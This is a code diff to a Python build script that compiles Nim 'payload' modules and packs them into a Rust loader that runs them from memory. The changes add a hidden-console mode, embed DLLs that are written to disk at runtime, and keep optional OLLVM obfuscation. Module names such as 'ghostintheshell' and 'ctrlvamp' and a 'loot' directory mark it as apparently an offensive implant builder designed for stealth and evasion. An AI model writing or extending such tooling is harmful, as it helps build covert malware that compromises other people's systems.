@@ -5,10 +5,11 @@ import sys
 import os
 import shutil
 import re
-import shlex
+import shlex 
 import subprocess
 import tempfile
-def compile_nim(nim_file, output_exe, os_name, arch):
+import base64
+def compile_nim(nim_file, output_exe, os_name, arch, hide_console=False):
     output_exe = Path(output_exe).resolve()
     print(f"[*] Compiling Nim -> {os_name}:{arch}")
 
@@ -24,6 +25,8 @@ def compile_nim(nim_file, output_exe, os_name, arch):
         else:
             nim_cmd.append("--os:windows")
             nim_cmd.append(f"--cpu:{arch}")
+        if hide_console:
+            nim_cmd.append("--app:gui")
 
     elif os_name == "linux":
         nim_cmd.append("--os:linux")
@@ -126,9 +129,8 @@ def merge_nim_modules(nim_files, out_dir: Path, options=None):
         sys.exit(1)
 
     print(f"[*] Merging modules: {nim_files}")
-    loot_dir = out_dir
-    loot_dir.mkdir(parents=True, exist_ok=True)
-    out_path = loot_dir / "combined.nim"
+    out_dir.mkdir(parents=True, exist_ok=True)
+    out_path = out_dir / "combined.nim"
 
     merged_imports = set()
     merged_code = []
@@ -191,22 +193,28 @@ def merge_nim_modules(nim_files, out_dir: Path, options=None):
                 continue
             final_code.append(merged_code[i])
 
-    with open(out_path, "w", encoding="utf-8") as fh:
-        fh.write("\n".join(sorted(merged_imports)))
-        fh.write("\n\n")
-        fh.write("\n".join(final_code))
-        fh.write("\n\n")
-        fh.write("proc main() =\n")
-        for main_content in main_contents:
-            if not main_content:
-                continue
-            fh.write("  block:\n")
-            for line in main_content:
-                fh.write("    " + line + "\n")
-        fh.write("\n")
-        fh.write("when isMainModule:\n")
-        fh.write("  main()\n")
+    final_content_parts = []
+    final_content_parts.append("\n".join(sorted(merged_imports)))
+    final_content_parts.append("\n\n")
+    final_content_parts.append("\n".join(final_code))
+    final_content_parts.append("\n\n")
+    final_content_parts.append("proc main() =\n")
+    for main_content in main_contents:
+        if not main_content:
+            continue
+        final_content_parts.append("  block:\n")
+        for line in main_content:
+            final_content_parts.append("    " + line + "\n")
+    final_content_parts.append("\n")
+    final_content_parts.append("when isMainModule:\n")
+    final_content_parts.append("  main()\n")
+    
+    final_content = "".join(final_content_parts)
 
+    with open(out_path, "w", encoding="utf-8") as fh:
+        fh.write(final_content)
+
+    # print("[*] --- Begin Combined Nim Code ---\n" + final_content + "\n[*] --- End Combined Nim Code ---")
     print(f"[+] Wrote merged Nim file: {out_path}")
     return out_path
 
@@ -229,7 +237,7 @@ def parse_target(target_str):
         sys.exit(1)
 
 
-def generate_rust_wrapper(nim_exe, final_exe, target_os, target_arch, embed_exe=None, obfuscate=False, ollvm=None):
+def generate_rust_wrapper(nim_exe, final_exe, target_os, target_arch, embed_exe=None, obfuscate=False, ollvm=None, hide_console=False, embedded_dlls=None):
     """Generate a Rust wrapper for the Nim executable using in-memory execution."""
     final_exe_path = Path(final_exe)
     package_name = final_exe_path.stem
@@ -260,14 +268,40 @@ def generate_rust_wrapper(nim_exe, final_exe, target_os, target_arch, embed_exe=
     }
 """
 
+    windows_subsystem_attr = ""
+    if target_os == "windows" and hide_console:
+        windows_subsystem_attr = '#![windows_subsystem = "windows"]'
+
+    dll_declarations = ""
+    dll_drop_code = ""
+    if embedded_dlls:
+        dll_declarations_parts = []
+        dll_drop_code_parts = ["    // Drop required DLLs to the current directory"]
+        for i, (dll_name, dll_bytes) in enumerate(embedded_dlls.items()):
+            dll_bytes_array = ','.join(str(b) for b in dll_bytes)
+            dll_declarations_parts.append(f'const DLL_{i}_NAME: &str = "{dll_name}";')
+            dll_declarations_parts.append(f'const DLL_{i}_DATA: &[u8] = &[{dll_bytes_array}];')
+            dll_drop_code_parts.append(f'    std::fs::write(DLL_{i}_NAME, DLL_{i}_DATA).expect("Failed to write {dll_name}");')
+        
+        dll_declarations = "\n".join(dll_declarations_parts)
+        dll_drop_code = "\n".join(dll_drop_code_parts)
+
     rust_code = f'''
+{windows_subsystem_attr}
 use memexec;
+use std::fs;
 
 {embed_decl}
+
+{dll_declarations}
+
 const NIM_PAYLOAD: &[u8] = &[{nim_payload_array}];
 
 fn main() {{
 {embed_code}
+
+{dll_drop_code}
+
     unsafe {{
         memexec::memexec_exe(NIM_PAYLOAD).expect("Failed to execute Nim payload from memory");
     }}
@@ -361,6 +395,7 @@ def main():
     parser.add_argument("--nim-only", action="store_true", help="Only build Nim exe (no Rust)")
     parser.add_argument("--obfuscate", action="store_true", help="Enable Rust OLLVM obfuscation")
     parser.add_argument("--ollvm", nargs="*", help="OLLVM passes: bcfobf subobf constenc ...")
+    parser.add_argument("--hide-console", action="store_true", help="Hide console window on Windows")
     parser.add_argument("--target", type=str, default="windows:amd64", help="Target triple (os:arch)")
     parser.add_argument("--option", action="append", help="Option to inject as const (e.g., key=value)")
 
@@ -375,6 +410,36 @@ def main():
 
     target_os, target_arch = parse_target(args.target)
 
+    script_dir = Path(__file__).parent.resolve()
+    dll_source_dir = script_dir / 'DLL'
+
+    MODULE_DLLS = {
+        'MODULE/ctrlvamp.nim': {'pcre64DllData_b64': 'pcre64.dll'},
+        'MODULE/ghostintheshell.nim': {
+            'cryptoDllData_b64': 'libcrypto-1_1-x64.dll',
+            'sslDllData_b64': 'libssl-1_1-x64.dll'
+        }
+    }
+
+    selected_module_paths = args.merge if args.merge else [args.nim_file]
+    embedded_dlls_for_rust = {}
+    nim_options = list(args.option) if args.option else []
+
+    for module_path in selected_module_paths:
+        normalized_path = str(Path(module_path)).replace(os.sep, '/')
+        if normalized_path in MODULE_DLLS:
+            for const_name, dll_name in MODULE_DLLS[normalized_path].items():
+                dll_path = dll_source_dir / dll_name
+                if dll_path.exists():
+                    dll_content = dll_path.read_bytes()
+                    if not args.nim_only and target_os == 'windows':
+                        print(f"[*] Queuing {dll_name} for Rust wrapper embedding.")
+                        embedded_dlls_for_rust[dll_name] = dll_content
+                    else:
+                        print(f"[*] Embedding {dll_name} as base64 for {Path(module_path).name}")
+                        b64_content = base64.b64encode(dll_content).decode('utf-8')
+                        nim_options.append(f"{const_name}={b64_content}")
+
     final_exe_path_str = args.output_exe
     if target_os == "windows" and not final_exe_path_str.lower().endswith(".exe"):
         final_exe_path_str += ".exe"
@@ -386,15 +451,15 @@ def main():
     with tempfile.TemporaryDirectory() as tmpdir:
         tmp_dir = Path(tmpdir)
         if args.merge:
-            loot_dir = final_exe.parent
-            launcher_source = merge_nim_modules(args.merge, loot_dir, options=args.option)
+            launcher_source = merge_nim_modules(args.merge, tmp_dir, options=nim_options)
         else:
             launcher_source = Path(args.nim_file)
-            patch_nim_file(launcher_source, args.option)
+            patch_nim_file(launcher_source, nim_options)
 
         suffix = ".exe" if target_os == "windows" else ""
         nim_exe_tmp = tmp_dir / f"{final_exe.stem}_nim_payload{suffix}"
-        compile_nim(launcher_source, nim_exe_tmp, target_os, target_arch)
+        should_hide_nim_console = args.hide_console and target_os == "windows"
+        compile_nim(launcher_source, nim_exe_tmp, target_os, target_arch, hide_console=should_hide_nim_console)
 
         if not args.nim_only and target_os == 'windows':
             print("[*] Generating Rust wrapper to embed Nim payload.")
@@ -404,7 +469,9 @@ def main():
                 target_os, target_arch,
                 embed_exe=args.embed,
                 obfuscate=args.obfuscate,
-                ollvm=args.ollvm
+                ollvm=args.ollvm,
+                hide_console=args.hide_console,
+                embedded_dlls=embedded_dlls_for_rust
             )
         else:
             if not args.nim_only and target_os != 'windows':
